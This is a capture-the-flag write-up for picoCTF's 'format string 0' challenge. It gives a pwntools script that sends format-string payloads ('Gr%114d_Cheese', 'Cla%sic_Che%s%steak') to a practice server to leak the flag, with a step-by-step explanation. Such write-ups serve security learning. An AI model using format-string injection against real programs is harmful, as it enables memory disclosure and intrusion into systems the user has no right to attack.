# format string 0

```markdown
Tags: `Binary Exploitation` `format_string` `browser_webshell_solvable`
```

## **Description**

Can you use your knowledge of format strings to make the customers happy?

<figure><img src="../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

## **Solution Strategy**

```python
from pwn import *

host = "mimas.picoctf.net"
port = 50012
conn = remote(host, port)

conn.recvuntil("Enter your recommendation: ")

conn.sendline("Gr%114d_Cheese")

conn.recvuntil("Enter your recommendation: ")

conn.sendline("Cla%sic_Che%s%steak")

result = conn.recvall()

print(result.decode())

conn.close()
```

* The script uses the `pwntools` library to connect to a remote server (`mimas.picoctf.net`) on port `50012`.
* It establishes a connection and waits to receive a prompt indicating to enter a recommendation.
* It sends the first recommendation `"Gr%114d_Cheese"` to the server.
* After that, it waits for the next prompt to enter another recommendation.
* It sends the second recommendation `"Cla%sic_Che%s%steak"` to the server.
* Finally, it waits to receive the response from the server and prints it after decoding from bytes to string.
* The connection is then closed.

## Flag

<figure><img src="../.gitbook/assets/Pasted image (24).png" alt=""><figcaption></figcaption></figure>

## Follow Me

* **LinkedIn**: [https://www.linkedin.com/in/waris-damkham/](https://www.linkedin.com/in/waris-damkham/)
* **Website**: [https://waris-damkham.netlify.app/](https://waris-damkham.netlify.app/#home)
